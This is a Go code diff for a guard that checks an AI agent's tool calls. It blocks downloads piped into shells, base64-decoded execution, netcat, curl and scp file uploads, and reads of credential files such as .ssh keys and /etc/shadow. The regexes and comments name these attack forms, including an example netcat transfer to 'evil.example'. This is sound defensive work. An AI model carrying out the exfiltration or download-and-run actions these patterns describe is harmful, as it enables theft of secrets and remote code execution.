@@ -34,25 +34,47 @@ const (
 	ruleOddKey      = "malformed-chunk"
 )
 
+// ncAddress is what netcat needs to reach anything before its input: shell words (options, not
+// Lean's ":" or ":="), then a host and a port. A port is a number, a range or a variable after
+// any word; a service name netcat looks up ("https", "echo") only after a word shaped like a host
+// (a dotted name, also one ending in a dot, an IPv4 or IPv6 address, a variable), since a list of names is never complete and a bare
+// word after a word is ordinary text. So "nc host 9000 < f" and "nc evil.example echo < f" are
+// transfers, while "have nc : a < b", "nc a b < c" and "nc x domain < y" are names and comparisons.
+const (
+	ncWord    = `(?:-[^\s<>]+|["'\w$\[{][^\s<>|;&]*)`
+	ncNumPort = `["']?(?:\d{1,5}(?:-\d{1,5})?|\$\{?\w+\}?)["']?`
+	ncHost    = `["']?(?:\$\{?\w+\}?|\[?` + ncIPv6 + `(?:%\w+)?\]?|[\w-]+(?:\.[\w-]+)*\.|[\w-]+(?:\.[\w-]+)+|localhost)["']?`
+	// ncIPv6: hex groups and at least two colons, an IPv4 tail allowed, never colons alone. No
+	// bound on the groups: a tripwire may take an invalid address, it must not miss a valid one.
+	ncIPv6     = `(?:[0-9A-Fa-f]{1,4}:(?:[0-9A-Fa-f]{0,4}:)+(?:[0-9A-Fa-f]{1,4}|` + ncIPv4 + `)?|(?:[0-9A-Fa-f]{0,4}:){2,}(?:[0-9A-Fa-f]{1,4}|` + ncIPv4 + `))`
+	ncIPv4     = `\d{1,3}(?:\.\d{1,3}){3}`
+	ncName     = `["']?[A-Za-z][\w-]*["']?`
+	ncAddress  = `(?:\s+` + ncWord + `)*\s+(?:` + ncWord + `\s+` + ncNumPort + `|` + ncHost + `\s+` + ncName + `)`
+	ncAfter    = `(?:\s+-[^\s<>]+|\s*(?:\d?>{1,2}&?|&>{1,2})\s*[^\s<>]+)*` // options and output redirections
+	ncRedirect = `\s*\d?<\s*\S`
+)
+
 // guardRules match dangerous tool calls. Credential paths are excused when the request
-// itself names them ("put the key in .env"): the node cannot add text to the request.
+// itself names them ("put the key in .env"): the node cannot add text to the request. why is
+// what a hold record keeps to say which pattern fired: fixed text, never the call's own.
 var guardRules = []struct {
-	rule string
-	re   *regexp.Regexp
+	rule, why string
+	re        *regexp.Regexp
 }{
-	{ruleDownloadExec, regexp.MustCompile(`(?i)\b(?:curl|wget|fetch|iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n|;&]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+)?(?:(?:ba|z|da|k|c|tc|fi)?sh|python[0-9.]*|perl|ruby|node|php|iex|invoke-expression)\b`)},
-	{ruleDownloadExec, regexp.MustCompile(`(?i)\b(?:(?:ba|z|da|k)?sh|source|\.)\s+(?:-c\s+)?["']?(?:<\(|\$\(|` + "`" + `)\s*(?:curl|wget|fetch)\b`)},
-	{ruleDownloadExec, regexp.MustCompile(`(?i)\b(?:iex|invoke-expression)\b[^\n]*\b(?:iwr|irm|invoke-webrequest|invoke-restmethod|downloadstring)\b`)},
-	{ruleCredentials, regexp.MustCompile(`(?i)(?:^|[\s"'=:(/~])\.(?:ssh|aws|gnupg|kube|docker)(?:/|\b)|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.git-credentials\b|(?:^|[\s"'=:(/~])\.netrc\b|/etc/shadow\b|(?:^|[\s"'=:(/~])\.env(?:\.[a-z]+)?(?:$|[\s"'):;,])`)},
-	{ruleEncoded, regexp.MustCompile(`(?i)\bbase64\s+(?:-d|-D|--decode)\b[^\n]*\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|python[0-9.]*|perl|eval)\b`)},
-	{ruleEncoded, regexp.MustCompile(`(?i)\b(?:(?:ba|z|da|k)?sh|eval)\b[^\n]*(?:\$\(|` + "`" + `)[^\n]*\bbase64\s+(?:-d|-D|--decode)\b`)},
-	{ruleEncoded, regexp.MustCompile(`(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-(?:e|en|enc|encodedcommand)\s+[A-Za-z0-9+/=]{16,}`)},
-	{ruleEncoded, regexp.MustCompile(`(?i)\b(?:exec|eval)\s*\(\s*(?:__import__\(\s*["']base64["']\s*\)\.|base64\.)?b64decode\b`)},
-	{ruleUpload, regexp.MustCompile(`\bcurl\b[^\n]*\s(?:-d|--data(?:-binary|-raw|-urlencode)?|-F|--form)\s*["']?(?:[\w.-]+=)?@`)},
-	{ruleUpload, regexp.MustCompile(`\bcurl\b[^\n]*\s(?:-T|--upload-file)\s`)},
-	{ruleUpload, regexp.MustCompile(`\bwget\b[^\n]*--post-file`)},
-	{ruleUpload, regexp.MustCompile(`\b(?:nc|ncat|netcat|socat)\b[^\n]*<\s*\S`)},
-	{ruleUpload, regexp.MustCompile(`\b(?:scp|rsync)\b[^\n]*\s(?:[\w.-]+@)?[A-Za-z0-9.-]+\.[A-Za-z]{2,}:`)},
+	{ruleDownloadExec, "a download piped into a shell or interpreter", regexp.MustCompile(`(?i)\b(?:curl|wget|fetch|iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n|;&]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+)?(?:(?:ba|z|da|k|c|tc|fi)?sh|python[0-9.]*|perl|ruby|node|php|iex|invoke-expression)\b`)},
+	{ruleDownloadExec, "a shell running a download", regexp.MustCompile(`(?i)\b(?:(?:ba|z|da|k)?sh|source|\.)\s+(?:-c\s+)?["']?(?:<\(|\$\(|` + "`" + `)\s*(?:curl|wget|fetch)\b`)},
+	{ruleDownloadExec, "PowerShell running a download", regexp.MustCompile(`(?i)\b(?:iex|invoke-expression)\b[^\n]*\b(?:iwr|irm|invoke-webrequest|invoke-restmethod|downloadstring)\b`)},
+	{ruleCredentials, "a credential file or folder the request does not name", regexp.MustCompile(`(?i)(?:^|[\s"'=:(/~])\.(?:ssh|aws|gnupg|kube|docker)(?:/|\b)|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.git-credentials\b|(?:^|[\s"'=:(/~])\.netrc\b|/etc/shadow\b|(?:^|[\s"'=:(/~])\.env(?:\.[a-z]+)?(?:$|[\s"'):;,])`)},
+	{ruleEncoded, "base64 decoded into a shell or interpreter", regexp.MustCompile(`(?i)\bbase64\s+(?:-d|-D|--decode)\b[^\n]*\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|python[0-9.]*|perl|eval)\b`)},
+	{ruleEncoded, "a shell running base64-decoded text", regexp.MustCompile(`(?i)\b(?:(?:ba|z|da|k)?sh|eval)\b[^\n]*(?:\$\(|` + "`" + `)[^\n]*\bbase64\s+(?:-d|-D|--decode)\b`)},
+	{ruleEncoded, "PowerShell with an encoded command", regexp.MustCompile(`(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-(?:e|en|enc|encodedcommand)\s+[A-Za-z0-9+/=]{16,}`)},
+	{ruleEncoded, "exec or eval of base64-decoded code", regexp.MustCompile(`(?i)\b(?:exec|eval)\s*\(\s*(?:__import__\(\s*["']base64["']\s*\)\.|base64\.)?b64decode\b`)},
+	{ruleUpload, "curl sending a file as form or data", regexp.MustCompile(`\bcurl\b[^\n]*\s(?:-d|--data(?:-binary|-raw|-urlencode)?|-F|--form)\s*["']?(?:[\w.-]+=)?@`)},
+	{ruleUpload, "curl uploading a file", regexp.MustCompile(`\bcurl\b[^\n]*\s(?:-T|--upload-file)\s`)},
+	{ruleUpload, "wget posting a file", regexp.MustCompile(`\bwget\b[^\n]*--post-file`)},
+	{ruleUpload, "netcat sending a file to a host and port", regexp.MustCompile(`\b(?:nc|ncat|netcat)(?:\.\w+)?["']?` + ncAddress + ncAfter + ncRedirect)},
+	{ruleUpload, "socat sending a file", regexp.MustCompile(`\bsocat\s(?:[^\n|;&<]|\d*>&|&>)*<\s*\S`)},
+	{ruleUpload, "scp or rsync to a remote host", regexp.MustCompile(`\b(?:scp|rsync)\b[^\n]*\s(?:[\w.-]+@)?[A-Za-z0-9.-]+\.[A-Za-z]{2,}:`)},
 }
 
 // urlHostRe finds the host of a web address; bareHostRe a host given to curl or wget without
@@ -113,46 +135,85 @@ func requestText(body map[string]any) string {
 	return b.String()
 }
 
-// checkToolCall returns the rule a tool call breaks, or "". Arguments are JSON; the check
-// reads their string values (unescaped), so quoting cannot hide a pattern.
-func checkToolCall(name, args, req string) string {
-	text := name + "\n" + args
-	var v any
-	if json.Unmarshal([]byte(args), &v) == nil {
-		var b strings.Builder
-		var walk func(any)
-		walk = func(x any) {
-			switch y := x.(type) {
-			case string:
-				b.WriteString(y)
-				b.WriteByte('\n')
-			case []any:
-				for _, e := range y {
-					walk(e)
-				}
-			case map[string]any:
-				for k, e := range y {
-					b.WriteString(k)
-					b.WriteByte('\n')
-					walk(e)
-				}
-			}
-		}
-		walk(v)
-		text += "\n" + b.String()
+// guardHit is what stopped an answer: the rule and, for the operator's hold record, why it
+// fired, in fixed words that name the pattern (guardRules) and hold nothing of the call or the
+// request. rule "" means nothing did.
+type guardHit struct {
+	rule, why string
+}
+
+// Reasons of the rules that are not a pattern of guardRules.
+const (
+	whyUnknownURL  = "a web address that is not in the request"
+	whyAfterFinish = "tool-call pieces after the calls were complete"
+	whyOddKey      = "a stream key in an unusual case"
+)
+
+// streamHit is the hit of a stream rule (guard.violation).
+func streamHit(rule string) guardHit {
+	switch rule {
+	case ruleAfterFinish:
+		return guardHit{rule, whyAfterFinish}
+	case ruleOddKey:
+		return guardHit{rule, whyOddKey}
 	}
+	return guardHit{rule: rule}
+}
+
+var (
+	// flatLines makes a text one line, joining shell line continuations first: rules that stop
+	// at a line end then see all of a command, and all of a script as the JSON text used to show it.
+	flatLines = strings.NewReplacer("\\\r\n", " ", "\\\n", " ", "\r\n", " ", "\n", " ", "\r", " ")
+	// flatEscapes does the same for arguments that are not valid JSON.
+	flatEscapes = strings.NewReplacer(`\\\n`, " ", `\\n`, " ", `\r`, " ", `\n`, " ", `\t`, " ", `\"`, `"`)
+)
+
+// callText is the text the rules read: every key, string and number of the arguments, decoded,
+// in order (a key given twice shows both values, whichever one a client takes), as one line.
+// Not the JSON itself: in `"cd x\ncat y"` the escape puts the words "ncat" and "nc" where the
+// command has none (2 of 4,535 recorded calls, one being Python's `\nc = open(...)`), and
+// quoting could hide a pattern. Arguments that do not parse are read as they came.
+func callText(name, args string) string {
+	if !json.Valid([]byte(args)) {
+		return name + "\n" + flatEscapes.Replace(args)
+	}
+	var b strings.Builder
+	d := json.NewDecoder(strings.NewReader(args))
+	d.UseNumber()
+	for {
+		t, err := d.Token()
+		if err != nil {
+			break
+		}
+		switch v := t.(type) {
+		case string:
+			b.WriteString(v)
+			b.WriteByte(' ')
+		case json.Number:
+			b.WriteString(v.String())
+			b.WriteByte(' ')
+		}
+	}
+	return name + "\n" + flatLines.Replace(b.String())
+}
+
+// checkToolCall returns what a tool call breaks; hit.rule is "" if nothing. The rules read a
+// write or edit tool's file text as well as shell commands: a script written now can run in the
+// next call, and in 1,032 recorded write and edit calls no rule fired on such text.
+func checkToolCall(name, args, req string) guardHit {
+	text := callText(name, args)
 	for _, r := range guardRules {
-		for _, m := range r.re.FindAllString(text, -1) {
-			if r.rule == ruleCredentials && strings.Contains(req, strings.ToLower(strings.Trim(m, " \t\n\"'=:(/~);,"))) {
+		for _, m := range r.re.FindAllStringIndex(text, -1) {
+			if r.rule == ruleCredentials && strings.Contains(req, strings.ToLower(strings.Trim(text[m[0]:m[1]], " \t\n\"'=:(/~);,"))) {
 				continue
 			}
-			return r.rule
+			return guardHit{r.rule, r.why}
 		}
 	}
 	if unknownHost(text, req) != "" {
-		return ruleUnknownURL
+		return guardHit{ruleUnknownURL, whyUnknownURL}
 	}
-	return ""
+	return guardHit{}
 }
 
 // maxGuardText bounds the answer text kept for the address check, and maxHeldArgs the tool
@@ -327,14 +388,14 @@ func (gd *guard) hold(tcs []any) {
 	}
 }
 
-// check returns the rule the held tool calls break, or "".
-func (gd *guard) check() string {
+// check returns what the held tool calls break; hit.rule is "" if nothing.
+func (gd *guard) check() guardHit {
 	for _, k := range gd.calls {
-		if r := checkToolCall(k.name, k.args.String(), gd.req); r != "" {
-			return r
+		if h := checkToolCall(k.name, k.args.String(), gd.req); h.rule != "" {
+			return h
 		}
 	}
-	return ""
+	return guardHit{}
 }
 
 // textFlag returns ruleTextURL if the answer text names a web address absent from the request.
@@ -401,9 +462,9 @@ func oddKey(v any) bool {
 	return false
 }
 
-// checkAssembled returns the rule a tool call in an assembled (non-streaming) answer breaks,
-// or "": the client gets exactly these calls, however the stream was cut into pieces.
-func checkAssembled(ans map[string]any, req string) string {
+// checkAssembled returns what a tool call in an assembled (non-streaming) answer breaks; hit.rule
+// is "" if nothing. The client gets exactly these calls, however the stream was cut into pieces.
+func checkAssembled(ans map[string]any, req string) guardHit {
 	choices, _ := ans["choices"].([]any)
 	for _, ch := range choices {
 		cm, _ := ch.(map[string]any)
@@ -413,12 +474,12 @@ func checkAssembled(ans map[string]any, req string) string {
 			fn, _ := c.(map[string]any)["function"].(map[string]any)
 			name, _ := fn["name"].(string)
 			args, _ := fn["arguments"].(string)
-			if r := checkToolCall(name, args, req); r != "" {
-				return r
+			if h := checkToolCall(name, args, req); h.rule != "" {
+				return h
 			}
 		}
 	}
-	return ""
+	return guardHit{}
 }
 
 // guardError is a tool call stopped by a guard.
